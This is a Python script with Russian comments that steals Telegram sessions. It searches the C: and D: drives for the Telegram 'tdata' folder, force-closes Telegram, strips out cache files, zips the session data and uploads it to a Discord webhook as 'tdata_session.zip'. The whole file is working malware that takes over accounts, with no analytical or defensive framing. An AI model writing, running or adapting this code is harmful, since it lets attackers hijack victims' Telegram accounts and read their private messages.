import os
import time
import zipfile
import shutil
import subprocess
from discord_webhook import DiscordWebhook

# ======= Настройки =======
FOLDER_NAME = 'tdata'
SEARCH_PATHS = ['D:\\', 'C:\\']
WEBHOOK_URL = "hook_url"

# ======= Поиск папки tdata =======
full_path = None
for path in SEARCH_PATHS:
    for root, dirs, _ in os.walk(path):
        if FOLDER_NAME in dirs:
            full_path = os.path.join(root, FOLDER_NAME)
            break
    if full_path:
        break 

# ======= Функции =======

def task_kill():
    subprocess.run(['taskkill', '/f', '/im', 'Telegram.exe'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.3)

def delete_fold():
    folders_to_remove = ['user_data', 'emoji']

    for folder in folders_to_remove:
        folder_path = os.path.join(full_path, folder)
        if os.path.isdir(folder_path):
            shutil.rmtree(folder_path)

    folder2_name = os.path.join(full_path, 'D877F783D5D3EF8C')
    for filename in os.listdir(folder2_name):
        file_path = os.path.join(folder2_name, filename)
        
        if os.path.isfile(file_path):
            file_size = os.path.getsize(file_path)
            
            if file_size > 3 * 1024 * 1024:
                os.remove(file_path)
        
def archive_tdata():
    archive_name = "tdata.zip"
    if os.path.exists(archive_name):
        os.remove(archive_name)  # Удаляем старый архив, если он есть

    with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as archive:
        for root, _, files in os.walk(full_path):
            for file in files:
                file_path = os.path.join(root, file)
                archive.write(file_path, os.path.relpath(file_path, os.path.join(full_path, '..')))


def send_to_discord():
    archive_name = "tdata.zip"
    if not os.path.exists(archive_name):
        return

    webhook = DiscordWebhook(url=WEBHOOK_URL)
    with open(archive_name, 'rb') as f:
        webhook.add_file(file=f.read(), filename='tdata_session.zip')

    response = webhook.execute()
    if response.status_code == 200 or response.status_code == 204:
        return 0
    else:
        print(f"Ошибка отправки файла. Код ответа: {response.status_code}")

# ======= Основной запуск =======
def main():
    task_kill()
    delete_fold()
    archive_tdata()
    send_to_discord()

if __name__ == "__main__":
    main()
